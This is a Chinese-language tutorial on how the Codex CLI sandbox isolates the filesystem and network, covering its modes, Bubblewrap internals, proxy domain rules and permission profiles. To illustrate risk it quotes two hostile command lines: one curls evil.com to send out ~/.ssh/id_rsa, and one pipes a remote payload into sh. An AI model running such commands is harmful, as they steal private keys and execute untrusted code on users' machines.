# Codex CLI 沙箱机制全解析：文件系统隔离与网络安全

> **TL;DR** Codex 的沙箱分三种模式——`read-only` 只读、`workspace-write` 工作区可写、`danger-full-access` 完全放开。底层在 macOS/Linux 用 Bubblewrap 做命名空间隔离，在 Windows 用原生沙箱。沙箱控制的是"技术上能不能做"，和审批策略（控制"要不要问你"）是两个独立的维度。`workspace-write` 模式下还可以通过 `writable_roots` 扩展可写目录、通过 `network_access` 控制出站网络。权限 Profile 系统允许你自定义文件系统和网络的精细规则。沙箱不是银弹——它防不了恶意 prompt 注入、防不了提权攻击、防不了供应链污染，但在日常开发场景下，它是最实用的安全底线。

---

## 1. 沙箱是什么，为什么重要

先把概念捋清楚。

你在终端里启动 Codex，它就能读文件、写文件、跑 shell 命令。这些能力本质上是你的操作系统权限——Codex 进程继承了你的用户权限，能做什么取决于你是谁。如果你是 root，Codex 就是 root；如果你是普通用户，Codex 就是普通用户。

问题在于，Codex 背后是一个 AI 模型，它的行为不完全可预测。你让它"帮我修复这个 bug"，它可能会执行 `rm -rf build/ && npm run build`——这本身没问题，但如果它误判了路径呢？如果它执行了 `curl https://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)` 呢？

沙箱就是用来解决这类问题的。它的核心思路很简单：**给 Codex 套一个技术层面的笼子，限制它能接触的文件和能用到的网络**。

你可以把它类比成 Docker 容器或者虚拟机，但比这两者都轻量得多。Docker 容器需要镜像和 daemon，虚拟机需要完整的 guest OS。Codex 的沙箱不需要这些额外设施——它直接利用操作系统的内核特性来实现隔离。

沙箱解决的是"最坏情况下的兜底防护"。你不需要信任 AI 模型的每一行输出，因为沙箱会物理上阻止它做超出权限的事。这是防御的最后一道墙，而不是唯一的一道墙。前面还有审批策略（第 05 篇讲过）、自动审查器（第 18 篇讲过），后面还有 git 回滚、备份恢复等补救措施。沙箱在中间，负责"不让事情变得更糟"。

一个关键认知：**沙箱和审批是正交的两个维度**。审批策略决定"Codex 做某件事前要不要问你"，沙箱决定"Codex 技术上能不能做这件事"。两者独立配置，互相配合。比如你把审批设成 `never`（永不询问），Codex 仍然不能写入 workspace 外的文件——因为沙箱拦着。反过来，你把沙箱设成 `danger-full-access`（完全放开），审批策略仍然可以在每次操作前弹窗让你确认。

---

## 2. 三种沙箱模式

Codex 的沙箱有三个级别，通过 `sandbox_mode` 配置项或 `--sandbox` CLI 标志指定。三个级别的名字很直白，不过 `danger-full-access` 里面的 `danger` 前缀值得注意——它在提醒你这个模式有风险。

### 2.1 read-only 只读模式

```toml
sandbox_mode = "read-only"
```

```shell
codex --sandbox read-only "审查这个项目的代码质量"
```

**行为**：Codex 可以读工作区里的所有文件，但不能写入任何文件。不管是 workspace 内的还是 workspace 外的，一律只读。

**适用场景**：

- 代码审查——你只需要 Codex 读代码、分析问题、给建议，不需要它改任何东西
- 学习陌生项目——先让 Codex 帮你理解代码结构，不急着动手改
- CI/CD 中的只读检查——比如 lint 扫描、依赖审计、安全分析
- 安全敏感环境——你不希望任何自动化工具修改文件系统

**实际体验**：在这个模式下，Codex 的行为非常受限。它能看到你的代码，能分析问题，但一旦它想创建或修改文件，操作会被沙箱直接拦截。你不会收到审批弹窗（因为操作在沙箱层面就被拦了，根本到不了审批这一步）。

如果你用 `read-only` 模式但 Codex 确实需要写文件怎么办？两种办法：

1. 临时切换到 `workspace-write` 模式，做完操作切回来
2. 用 `/sandbox-add-read-dir`（Windows）或 `writable_roots` 配置添加例外

`read-only` 是最安全的模式，但也最"笨"——Codex 很多时候需要写临时文件（比如中间产物、测试覆盖率报告），这些在 `read-only` 下都做不到。

### 2.2 workspace-write 工作区可写模式

```toml
sandbox_mode = "workspace-write"
```

```shell
codex --sandbox workspace-write "给这个 API 加上单元测试"
```

**行为**：Codex 可以读取所有文件（和 `read-only` 一样），但只能在当前工作目录（cwd）和 `writable_roots` 指定的额外目录下写入文件。写入工作区外的文件会被拦截。

这是 Codex 的**默认沙箱模式**，也是日常开发中最常用的模式。

`workspace-write` 模式有几个可配置的子选项：

```toml
sandbox_mode = "workspace-write"

[sandbox_workspace_write]
writable_roots = ["/tmp/my-project-cache", "/var/shared"]
network_access = false
exclude_slash_tmp = true
exclude_tmpdir_env_var = true
```

逐个解释：

- **`writable_roots`**：额外可写目录的列表。默认只有 cwd 可写，如果你需要 Codex 往 `/tmp` 或者共享目录写东西，在这里加路径。注意路径必须是绝对路径。
- **`network_access`**：是否允许出站网络访问。默认 `false`。设成 `true` 后，Codex 执行的命令可以发起网络请求（`curl`、`npm install`、`pip install` 等）。
- **`exclude_slash_tmp`**：是否排除 `/tmp` 目录。默认 `true`。这个选项看起来有点矛盾——如果 `network_access = false` 已经禁了网络，为什么还要单独排除 `/tmp`？因为 `/tmp` 可能包含 socket 文件和其他进程间通信的入口，排除它可以进一步收紧隔离。
- **`exclude_tmpdir_env_var`**：是否排除 `$TMPDIR` 环境变量指向的目录。默认 `true`。macOS 上 `$TMPDIR` 通常是 `/var/folders/xx/.../T/`，排除它和排除 `/tmp` 的逻辑类似。

**适用场景**：

- 日常开发——改代码、写测试、跑构建
- 需要 `npm install` 或 `pip install` 的场景（配合 `network_access = true`）
- 多项目开发——通过 `writable_roots` 把公共缓存目录加进来

### 2.3 danger-full-access 完全访问模式

```toml
sandbox_mode = "danger-full-access"
```

```shell
codex --sandbox danger-full-access "部署到生产服务器"
```

**行为**：没有文件系统沙箱。Codex 拥有你当前用户的全部权限——能读写任意文件，能执行任意命令。

注意这个名字里有两个关键词：`danger` 和 `full-access`。Codex 官方在提示模板里明确写了 "no filesystem sandboxing, meaning all commands are permitted"。

**但是**，`danger-full-access` 并不等同于"什么都不限制"。网络访问仍然由 `network_access` 配置项独立控制。即使沙箱完全放开，如果你没有显式启用网络，Codex 仍然不能联网。

**适用场景**：

- Docker 容器或虚拟机内部运行——容器本身已经是隔离环境，沙箱的额外隔离是多余的
- CI/CD 环境——Runner 本身是临时的、可销毁的
- 系统管理任务——需要修改 `/etc`、安装系统包等操作

**什么时候不该用**：

- 你的个人开发机上——除非你完全信任 Codex 的每一行输出
- 有敏感数据的环境——`~/.ssh`、`~/.aws`、`~/.config/gcloud` 这些目录对 Codex 完全敞开
- 多人共享的服务器——你不想让 Codex 影响其他用户

三模式对比表：

| 特性 | read-only | workspace-write | danger-full-access |
|------|-----------|-----------------|-------------------|
| 读取文件 | 全部可读 | 全部可读 | 全部可读 |
| 写入 cwd | 禁止 | 允许 | 允许 |
| 写入 cwd 外 | 禁止 | 禁止 | 允许 |
| writable_roots | 不适用 | 可配置 | 不适用 |
| 网络访问 | 默认禁止 | 可配置 | 可配置 |
| 安全级别 | 最高 | 适中 | 最低 |

---

## 3. 沙箱的底层实现

### 3.1 macOS/Linux：Bubblewrap

Codex 在 macOS 和 Linux 上的沙箱底层是 **Bubblewrap**（`bwrap`），这是 Flatpak 项目开发的一个轻量级沙箱工具。它利用 Linux 内核的命名空间（namespace）机制来实现隔离。

Bubblewrap 的工作原理可以这样理解：正常情况下，你的进程看到的文件系统是"真实的"——`/home` 就是 `/home`，`/etc` 就是 `/etc`。Bubblewrap 在创建子进程时，通过 `mount --bind` 重新映射文件系统。它先把整个根目录挂载为只读（`--ro-bind / /`），然后把需要可写的目录单独重新挂载为读写（`--bind /your/project /your/project`）。这样，子进程看到的文件系统和真实文件系统几乎一样，但只有你指定的目录是可写的。

Codex 的 Bubblewrap 具体做了这些事：

1. **用户命名空间隔离**（`--unshare-user`）：子进程在一个独立的用户命名空间里运行。在这个命名空间里，进程看到的 UID 可能和宿主机不同。
2. **PID 命名空间隔离**（`--unshare-pid`）：子进程看不到宿主机的其他进程。`ps aux` 只能看到沙箱内的进程。
3. **网络命名空间隔离**（`--unshare-net`）：当网络被禁用时，子进程有独立的网络栈——没有网卡、没有路由、没有网络连接。
4. **seccomp 过滤器**：限制子进程能调用的系统调用。比如禁止创建新的网络 socket。
5. **`PR_SET_NO_NEW_PRIVS`**：防止子进程通过 `setuid` 等方式提升权限。
6. **保护路径覆盖**：`.git` 目录、`.codex` 目录这些敏感路径，即使父目录可写，也会被重新挂载为只读（`--ro-bind`）。

Bubblewrap 的查找顺序：

1. `PATH` 上的 `bwrap` 命令——如果系统已经安装了 Bubblewrap
2. Codex 自带的 `codex-resources/bwrap`——如果系统没有安装
3. 回退到 legacy Landlock + mount 方案——如果 Bubblewrap 不可用（需要显式配置 `features.use_legacy_landlock = true`）

一些边界情况值得注意：

- **WSL2**：走正常的 Linux Bubblewrap 路径，支持良好
- **WSL1**：不支持 Bubblewrap 沙箱。Codex 会拒绝需要 Bubblewrap 的操作
- **老旧 Bubblewrap**：如果系统上的 `bwrap` 版本太旧，不支持 `--argv0` 参数，Codex 会用兼容路径
- **命名空间创建失败**：如果内核不允许创建用户命名空间（某些容器环境里常见），Codex 启动时会显示警告，而不是等到运行时才崩溃

### 3.2 Windows：原生沙箱

Windows 上没有 Bubblewrap，Codex 使用 Windows 原生的沙箱机制。

Windows 沙箱支持两种权限级别：

- **`unelevated`**：普通用户权限。Codex 进程以当前用户权限运行，沙箱限制文件系统访问。
- **`elevated`**：管理员权限。Codex 进程以管理员权限运行，沙箱仍然限制文件系统访问，但因为进程本身权限更高，沙箱的保护效果会减弱。

Windows 沙箱还支持一个 `sandbox_private_desktop` 选项。启用后，Codex 的进程在一个"私有桌面"上运行——它看不到你的正常桌面窗口，你也不太容易直接和它的 UI 交互。这个选项主要是为了安全隔离，防止 Codex 的进程和你的正常桌面进程之间发生意外的交互（比如窗口消息注入）。

```toml
[windows]
sandbox = "unelevated"  # or "elevated"
sandbox_private_desktop = true
```

Windows 沙箱在实现上依赖 Windows 的作业对象（Job Objects）和完整性级别（Integrity Levels）。Job Objects 可以限制进程能访问的资源、能创建的子进程。完整性级别则是一种进程隔离机制——低完整性级别的进程不能写入高完整性级别的对象。

### 3.3 命名空间隔离原理

不管用 Bubblewrap 还是 Windows 沙箱，核心思路都是一样的：**让 Codex 的子进程以为自己在一台独立的机器上运行**。

Linux 命名空间是内核提供的资源隔离机制。常见的命名空间类型包括：

| 命名空间类型 | 隔离内容 | Bubblewrap 是否使用 |
|------------|---------|-------------------|
| Mount | 文件系统挂载点 | 是（`--ro-bind`、`--bind`） |
| User | 用户和组 ID | 是（`--unshare-user`） |
| PID | 进程 ID | 是（`--unshare-pid`） |
| Network | 网络栈、端口、路由 | 是（`--unshare-net`） |
| UTS | 主机名和域名 | 否（不需要） |
| IPC | 进程间通信 | 否 |
| Cgroup | cgroup 根目录 | 否 |

命名空间隔离和虚拟机的区别在于：虚拟机有独立的内核，命名空间共享内核。这意味着命名空间更轻量（没有虚拟化开销），但也意味着隔离不是绝对的——内核漏洞可能打破隔离。

不过对于 Codex 的使用场景来说，命名空间隔离已经足够了。你要防的是 AI 模型不小心执行了危险操作，而不是防一个有内核漏洞利用能力的攻击者。

---

## 4. 文件系统隔离细节

### 4.1 可读目录

在所有三种沙箱模式下，Codex 都可以读取工作区内的文件。这是合理的——如果连代码都看不到，AI 编程助手就完全没法工作了。

`read-only` 和 `workspace-write` 模式下，**读权限覆盖整个文件系统**。Codex 可以读 `/etc/passwd`、`~/.bashrc`、`/usr/local/lib/` 下的任何文件。这是有意的设计——很多开发任务需要读取系统文件（比如查看环境变量配置、读取已安装包的文档）。

如果你担心 Codex 读取敏感文件，需要用权限 Profile 的 `filesystem.<path> = "deny"` 规则来限制。这个在后面第 6 节详细讲。

### 4.2 可写目录与 writable_roots

`workspace-write` 模式的核心逻辑：**cwd 可写，cwd 外不可写**。

这里的 cwd 指的是你启动 `codex` 命令时所在的目录。如果你在 `/home/me/projects/myapp` 下运行 `codex`，那 `/home/me/projects/myapp` 就是可写的根目录。Codex 可以在这个目录下创建、修改、删除文件。

但有时候 cwd 不够。几个常见需求：

- Codex 需要往 `/tmp` 写临时文件（某些工具的默认行为）
- 你的项目有一个外部的数据目录，Codex 需要往里写东西
- 多个 Codex 实例共享一个缓存目录

这时候用 `writable_roots`：

```toml
sandbox_mode = "workspace-write"

[sandbox_workspace_write]
writable_roots = ["/tmp", "/home/me/shared-data"]
```

注意几点：

- `writable_roots` 是**追加**的，不是替换的。cwd 始终可写，不需要重复写进去。
- 路径必须是绝对路径。相对路径不会生效。
- 如果路径不存在，Bubblewrap 在尝试 bind mount 时可能报错。

### 4.3 /tmp 排除策略

默认配置下，`workspace-write` 模式排除了 `/tmp` 和 `$TMPDIR`。这不是说 Codex 不能读 `/tmp`，而是说 `/tmp` 不在自动可写的范围内。

为什么？因为 `/tmp` 是一个特殊的目录。很多程序和进程在里面放临时文件、socket 文件、命名管道。如果 Codex 能自由写 `/tmp`，理论上它可以：

- 覆盖其他进程的临时文件
- 创建 socket 文件来进行进程间通信
- 通过 `/tmp` 间接影响其他程序的行为

在大多数开发场景下，你不需要 Codex 写 `/tmp`。编译产物放在项目的 `build/` 或 `dist/` 里，测试覆盖率报告可以输出到项目目录下的文件，`npm install` 的缓存有自己的位置。

但如果你的工作流确实需要往 `/tmp` 写（比如某些测试框架的临时目录配置），显式设置 `exclude_slash_tmp = false` 就行。

### 4.4 路径解析与符号链接

Bubblewrap 在处理路径时，会解析符号链接。这意味着：

- 如果 `/home/me/project` 是一个指向 `/mnt/data/project` 的符号链接，Bubblewrap 会把 `/mnt/data/project` 作为实际的可写根目录
- 如果 cwd 下有符号链接指向 cwd 外的位置，Codex 通过这个符号链接写入时，Bubblewrap 会检查目标路径是否在可写范围内

Codex 还对 `.git` 目录做了特殊处理。即使 cwd 可写，`.git` 目录会被重新挂载为只读。这是为了防止 Codex 意外破坏 git 仓库的内部结构。`.codex` 目录同样被保护——Codex 不应该修改自己的配置。

对于不可读的 glob 条目（比如 `filesystem."/secret/**" = "deny"`），Bubblewrap 会在启动沙箱前扫描匹配的文件，把找到的文件用 `/dev/null` 覆盖。这确保了即使进程绕过了路径检查，也无法通过 glob 匹配到这些文件。

你可以通过 `glob_scan_max_depth` 配置项控制扫描深度，防止在大型文件系统上扫描时间过长：

```toml
[permissions.my-profile]
glob_scan_max_depth = 10
```

---

## 5. 网络隔离

### 5.1 默认无网络

这是 Codex 沙箱设计里一个非常重要的决策：**默认情况下，沙箱内的进程没有网络访问能力**。

不管你用哪种沙箱模式，网络默认都是关闭的。这意味着：

- `codex "安装项目依赖"` 在默认配置下，Codex 执行 `npm install` 或 `pip install` 会失败——因为它无法连接 npm registry 或 PyPI
- `codex "拉取最新的代码"` 里的 `git pull` 也会失败——除非网络被显式启用

这是故意为之。很多 AI 编程任务（写代码、重构、修 bug、跑本地测试）完全不需要网络。默认禁用网络，可以防止 Codex 的操作产生意外的网络副作用——比如某个依赖包在安装时执行了恶意脚本并回传数据。

### 5.2 network_access 配置

启用网络很简单：

```toml
sandbox_mode = "workspace-write"

[sandbox_workspace_write]
network_access = true
```

```shell
codex --sandbox workspace-write "安装依赖并运行测试"
# 如果 config.toml 里已经配置了 network_access = true，不需要额外参数
```

启用网络后，沙箱内的进程可以发起任意的出站 TCP/UDP 连接。这是一个粗粒度的开关——要么全开，要么全关。

如果你需要更精细的控制（比如只允许访问 GitHub，不允许访问其他域名），就需要用网络代理模式。

### 5.3 网络代理模式

Codex 内置了一个网络代理（`codex-network-proxy`），可以在启用网络访问的同时，对域名级别的访问进行精细化控制。

```toml
default_permissions = "workspace"

[permissions.workspace.network]
enabled = true
proxy_url = "http://127.0.0.1:3128"
enable_socks5 = true
socks_url = "http://127.0.0.1:8081"
```

工作原理：

1. 沙箱内的进程没有直接的网络访问
2. Codex 启动一个内部的 TCP -> Unix Domain Socket -> TCP 路由桥
3. 所有网络流量经过这个桥，转发到配置的代理服务器
4. 代理服务器根据域名规则决定是放行还是拦截

代理模式下，seccomp 过滤器会阻止沙箱内进程创建新的 Unix socket，防止它绕过代理直接通信。

### 5.4 域名策略规则

域名策略是代理模式的核心。通过 `domains` 配置，你可以精确控制哪些域名可以访问：

```toml
[permissions.workspace.network.domains]
"*.openai.com" = "allow"
"*.github.com" = "allow"
"registry.npmjs.org" = "allow"
"pypi.org" = "allow"
"localhost" = "allow"
"127.0.0.1" = "allow"
"evil.example.com" = "deny"
```

规则说明：

- 支持精确匹配（`registry.npmjs.org`）和通配符匹配（`*.github.com`）
- 通配符只匹配一级子域名。`*.openai.com` 匹配 `api.openai.com`，但不匹配 `sub.api.openai.com`
- 如果需要多级通配，用 `**.openai.com`
- 全局通配符 `*` 被拒绝——你必须显式列出允许的域名
- `deny` 规则优先级高于 `allow`——如果同一个域名同时有 allow 和 deny 规则，deny 赢

一个实用的配置建议：大多数开发场景只需要访问代码托管平台和包管理器。把这两个放开，其余全部默认拦截，就能覆盖 90% 的需求。

代理模式还支持 **HTTPS MITM**（中间人）钩子。这个功能听起来吓人，但在特定场景下很有用——比如你想让 Codex 访问 GitHub API 但 strip 掉认证信息：

```toml
[permissions.workspace.network.mitm.hooks.github_write]
host = "api.github.com"
methods = ["POST", "PUT"]
path_prefixes = ["/repos/openai/"]
action = ["strip_auth"]

[permissions.workspace.network.mitm.actions.strip_auth]
strip_request_headers = ["authorization"]
```

MITM 的 CA 证书由 Codex 自己管理，放在 `$CODEX_HOME/proxy/` 目录下。当 MITM 启用时，沙箱内的进程会收到指向这个 CA 的环境变量，自动信任它。

---

## 6. 权限 Profile 系统

### 6.1 基本概念

权限 Profile 是 Codex 沙箱系统的精细控制层。如果说三种沙箱模式是预设的安全等级，权限 Profile 就是你自定义的安全规则集。

每个 Profile 定义了文件系统和网络两个维度的权限。你可以创建多个 Profile，在不同场景下切换。

```toml
default_permissions = "workspace"  # 使用名为 "workspace" 的 profile

# 定义一个名为 "workspace" 的 profile
[permissions.workspace]
# 文件系统和网络规则...
```

### 6.2 内置 Profile

Codex 有几个内置的特殊 token，用作 Profile 的快捷方式：

- **`:minimal`**：最小权限集。只允许最基本的操作
- **`:workspace_roots`**：以 workspace 的根目录作为权限基准。`:workspace_roots.<subpath>` 可以指定根目录下的子路径权限

这些 token 是快捷方式，不需要你手动定义。它们在配置文件中可以直接使用：

```toml
[permissions.my-profile.filesystem]
":workspace_roots" = "write"          # workspace 根目录可写
":workspace_roots.secret" = "deny"    # workspace/secret 目录禁止访问
":workspace_roots.config" = "read"     # workspace/config 目录只读
```

### 6.3 自定义 Profile

你可以定义任意数量的自定义 Profile。每个 Profile 有两个部分：文件系统规则和网络规则。

**文件系统规则**：

```toml
[permissions.my-profile.filesystem]
"/home/me/projects" = "write"          # 可读写
"/etc/nginx" = "read"                  # 只读
"/home/me/.ssh" = "deny"              # 禁止访问
":workspace_roots" = "write"           # workspace 可写
":workspace_roots.env" = "deny"        # workspace/env 禁止
```

路径权限有三个级别：

| 权限值 | 含义 | 效果 |
|--------|------|------|
| `"read"` | 只读 | 可以读取目录下的文件，不能写入 |
| `"write"` | 可读写 | 可以读取和写入目录下的文件 |
| `"deny"` | 禁止 | 不能读取也不能写入 |

**网络规则**：

```toml
[permissions.my-profile.network]
enabled = true

[permissions.my-profile.network.domains]
"*.openai.com" = "allow"
"*.github.com" = "allow"
"registry.npmjs.org" = "allow"
```

### 6.4 Profile 与沙箱模式的关系

这是一个容易混淆的点。沙箱模式（`sandbox_mode`）和权限 Profile（`permissions.<name>`）是两个独立的系统，但它们互相影响。

简单来说：

- **沙箱模式决定大框架**。`read-only` 意味着所有写入被拦截，`workspace-write` 意味着 cwd 可写，`danger-full-access` 意味着没有文件系统限制。
- **权限 Profile 在沙箱框架内做精细调整**。如果沙箱是 `read-only`，Profile 里的 `filesystem."/path" = "write"` 不会覆盖沙箱的限制——沙箱层面的只读仍然生效。

但在 `workspace-write` 和 `danger-full-access` 模式下，Profile 可以进一步收紧权限。比如沙箱允许写入 cwd，但 Profile 把 cwd 下的某个子目录设为 `deny`，那这个子目录实际上是写不了的。

所以更准确的说法是：**最终生效的权限 = 沙箱模式和 Profile 的交集**。Profile 只能收紧，不能放宽。

---

## 7. Shell 执行与沙箱

### 7.1 unified_exec 统一执行

Codex 执行 shell 命令的方式经历了演变。早期的实现中，文件操作和命令执行是分开的。后来引入了 `features.unified_exec`，用一个统一的 PTY（伪终端）执行工具来处理所有命令执行。

```toml
[features]
unified_exec = true  # 启用统一 PTY 执行工具
```

统一执行的意义在于：所有命令都在同一个 PTY 会话里运行，环境变量、工作目录、历史命令的上下文得以保持。这对某些需要多步交互的命令（比如 `git rebase`）很重要。

`unified_exec` 启用后，shell 工具的行为更接近你在终端里的体验。Codex 执行的每条命令都在这个 PTY 里，命令之间可以共享 shell 的状态（环境变量、alias、函数定义等）。

### 7.2 shell_tool Shell 工具开关

```toml
[features]
shell_tool = true  # 启用 Shell 工具
```

`shell_tool` 控制的是 Codex 是否能使用 shell 工具来执行命令。如果设成 `false`，Codex 不能执行任何 shell 命令——它只能读取文件和通过其他工具操作。

这个开关在极端安全场景下有用。比如你只想让 Codex 做代码审查，不想让它跑任何命令，把 `shell_tool = false` 就行。

### 7.3 shell_snapshot 环境快照

```toml
[features]
shell_snapshot = true  # 启用 Shell 环境快照
```

`shell_snapshot` 的作用是在会话开始时，捕获当前 shell 环境的"快照"——包括环境变量、PATH、alias、函数定义等。Codex 后续执行的命令可以基于这个快照来运行，确保它在和你一样的 shell 环境下工作。

没有 `shell_snapshot`，Codex 执行的命令可能在一个最小化的 shell 环境里运行——PATH 可能不完整，环境变量可能缺失，alias 和函数定义不会生效。这对于依赖特定环境配置的命令（比如用了自定义的 shell 函数或环境变量）来说是个问题。

### 7.4 shell_environment_policy

Codex 还提供了 `shell_environment_policy` 配置，控制 Codex 执行命令时的环境变量策略。这个配置决定 Codex 是否能读取和修改当前 shell 的环境变量。

```toml
shell_environment_policy = "passthrough"  # 透传当前 shell 的所有环境变量
```

在沙箱环境下，`shell_environment_policy` 和 Bubblewrap 的命名空间隔离互相配合。即使沙箱限制了文件系统和网络访问，shell 环境变量仍然是透传的——因为环境变量不涉及文件 I/O 或网络请求，不需要被隔离。

---

## 8. 安全风险与边界

### 8.1 沙箱不能防止什么

沙箱是最后一道防线，不是万能的。明确它不能防止什么，比知道它能防止什么更重要。

**沙箱不能防止恶意 prompt 注入**。如果你从不可信的来源粘贴了一段 prompt（比如从网上找来的"让 AI 帮你做 XXX"的提示词模板），这段 prompt 里可能包含隐藏指令，让 Codex 在你觉得安全的时候做不安全的事。沙箱只限制文件系统和网络，不限制 Codex "想"做什么。

**沙箱不能防止提权攻击**。如果你的系统有本地提权漏洞，Codex 即使在沙箱里也可能利用这个漏洞获取更高权限。不过这种情况极其罕见，日常开发几乎不会遇到。

**沙箱不能防止供应链污染**。如果 `npm install` 安装了一个恶意包（postinstall 脚本执行了 `curl evil.com/payload | sh`），即使沙箱启用了网络，恶意代码仍然会在沙箱内执行。沙箱会阻止它读取 `~/.ssh`（如果在 cwd 外），但它在 cwd 内能做的事情仍然可能造成损害。

**沙箱不能防止信息泄露到 Codex 的上下文里**。Codex 读取的文件内容会进入模型上下文。如果你在 `danger-full-access` 模式下让 Codex 工作，它读到的 API key、密码、私钥内容理论上都会被发送到 OpenAI 的服务器。沙箱管的是"写不写"，不管"读到的内容发不发给模型"。

### 8.2 绕过风险

几种理论上的沙箱绕过方式：

**通过编译型语言绕过**。Codex 可以在沙箱内编译和运行 Rust/C/C++ 程序。编译后的二进制在沙箱内运行，但如果有内核漏洞可以利用，理论上可以逃逸。实际风险极低——Codex 不是在故意攻击你的系统，它只是在执行开发任务。

**通过符号链接绕过**。如果 cwd 下有一个符号链接指向 cwd 外的目录，Codex 通过这个链接写入时是否受沙箱保护？答案取决于沙箱实现。Bubblewrap 会解析符号链接并检查实际路径，所以直接通过符号链接绕过不太可能。但如果 cwd 本身就是通过符号链接指向某个敏感目录（比如你把 Codex 启动在 `~/secret-project`，而这个目录链接到 `/etc`），那 cwd 就变成了可写的——这是你自己的配置问题，不是沙箱的 bug。

**通过 Git hooks 绕过**。Codex 执行 `git commit` 时会触发 pre-commit hooks。如果 hook 脚本做了恶意操作（比如把文件内容发到外部服务器），这些操作在沙箱内执行，受沙箱限制。但如果网络已经开启，hook 的网络请求不会被拦截——除非你用了代理模式并限制了域名。

**通过嵌套进程绕过**。Codex 可以启动子进程，子进程也可以启动子进程。Bubblewrap 的命名空间隔离是传递的——子进程和孙进程都在同一个命名空间里，受同样的限制。seccomp 过滤器和 `PR_SET_NO_NEW_PRIVS` 进一步防止子进程提升权限。

### 8.3 升级路径

如果你需要比沙箱更强的隔离，有几个选择：

1. **Docker 容器**：在 Docker 容器里运行 Codex，容器本身提供额外的隔离层。Codex 的沙箱在容器内部再套一层。双重隔离。
2. **虚拟机**：在虚拟机里运行 Codex，隔离最强。即使 Codex 完全失控，也只能影响虚拟机内部。
3. **Firecracker / gVisor**：轻量级虚拟机方案，隔离程度接近虚拟机，但启动更快。
4. **专用 CI Runner**：在临时的、可销毁的 CI runner 上运行 Codex。每次运行结束，销毁整个 runner。

对于大多数个人开发者和中小团队来说，Codex 自带的沙箱 + 合理的审批策略已经足够。只有在处理特别敏感的数据（生产密钥、客户数据）或在高合规要求的环境下，才需要考虑更强的隔离方案。

---

## 9. 沙箱配置实战

### 9.1 场景一：个人开发推荐配置

大多数个人开发者的日常场景：在本地开发 Web 项目或后端项目，需要安装依赖、运行测试、偶尔搜索网络。

```toml
# ~/.codex/config.toml

# 使用 workspace-write 作为默认沙箱模式
sandbox_mode = "workspace-write"

# 审批策略用 on-request（默认值，显式写出）
approval_policy = "on-request"

[sandbox_workspace_write]
# 需要 npm install / pip install 时开启
network_access = true
# 排除 /tmp，减少攻击面
exclude_slash_tmp = true
exclude_tmpdir_env_var = true
```

这个配置的思路：让 Codex 在 workspace 内自由工作，需要网络就给网络，但排除 `/tmp`。审批策略是 `on-request`，超出沙箱的操作需要你确认。

如果你担心 Codex 读取敏感文件，加一个权限 Profile：

```toml
default_permissions = "dev"

[permissions.dev.filesystem]
"/home/you/.ssh" = "deny"
"/home/you/.aws" = "deny"
"/home/you/.config/gcloud" = "deny"

[permissions.dev.network]
enabled = true

[permissions.dev.network.domains]
"*.openai.com" = "allow"
"*.github.com" = "allow"
"registry.npmjs.org" = "allow"
"pypi.org" = "allow"
"localhost" = "allow"
```

### 9.2 场景二：企业安全策略

企业环境：需要防止 AI 工具访问敏感配置、连接未经授权的外部服务。

```toml
# ~/.codex/config.toml（由企业管理员统一部署）

sandbox_mode = "workspace-write"
approval_policy = "untrusted"

[sandbox_workspace_write]
network_access = false  # 默认禁用网络
exclude_slash_tmp = true
exclude_tmpdir_env_var = true

default_permissions = "enterprise"

[permissions.enterprise.filesystem]
"/etc" = "read"               # 允许读取系统配置，但不能写
"/home" = "read"              # 允许读取 home 目录，但不能写
":workspace_roots" = "write"  # workspace 可写
":workspace_roots.prod" = "deny"  # 但 workspace/prod 不可碰

[permissions.enterprise.network]
enabled = false  # 网络完全禁用
```

配合 requirements.toml 进一步收紧：

```toml
# requirements.toml（放在项目根目录）
allowed_sandbox_modes = ["read-only", "workspace-write"]
experimental_network = false
```

`requirements.toml` 是项目管理员放在代码仓库里的约束文件。它和 config.toml 不一样——config.toml 是用户级配置，requirements.toml 是项目级约束。后者优先级更高，用户不能通过修改自己的 config.toml 来绕过。

`allowed_sandbox_modes` 限制这个项目只能使用指定的沙箱模式。如果管理员只允许 `read-only` 和 `workspace-write`，用户就不能切换到 `danger-full-access`。

### 9.3 场景三：CI/CD 环境配置

CI/CD 环境的特点：Runner 是临时的、可销毁的，每次运行结束后整个环境都会被清理。

```toml
# 在 CI 的 Dockerfile 或启动脚本中设置

sandbox_mode = "workspace-write"
approval_policy = "never"  # CI 环境，不需要人工审批

[sandbox_workspace_write]
network_access = true      # CI 需要拉取依赖
writable_roots = ["/tmp"]   # 某些工具需要 /tmp
exclude_slash_tmp = false   # CI 环境允许写 /tmp

[features]
unified_exec = true
shell_tool = true
shell_snapshot = false       # CI 环境 shell 环境固定，不需要快照
```

CI 环境下用 `never` 审批策略是合理的——因为没有人在旁边看审批弹窗，弹了也没人点。安全依赖 Runner 本身的临时性和销毁机制。

如果 CI 任务只需要代码审查（不修改文件），可以用更严格的配置：

```toml
sandbox_mode = "read-only"
approval_policy = "never"

[features]
shell_tool = true  # 允许跑只读的检查命令（lint、static analysis）
```

---

## 延伸阅读

- **第 05 篇**：三种审批模式详解——沙箱和审批的配合使用
- **第 18 篇**：权限与安全命令——`/permissions`、`/approve` 等运行时调整
- **第 30 篇**（待写）：审批策略详解——`granular` 细粒度控制和 `auto_review`
- **第 32 篇**（待写）：权限 Profile 机制——自定义安全规则集的完整指南
- **第 33 篇**（待写）：网络安全与隔离——网络代理的深入配置

Codex 官方文档：
- [Sandboxing concepts](https://developers.openai.com/codex/concepts/sandboxing)
- [codex-rs/linux-sandbox README](https://github.com/openai/codex/blob/main/codex-rs/linux-sandbox/README.md)
- [codex-rs/network-proxy README](https://github.com/openai/codex/blob/main/codex-rs/network-proxy/README.md)
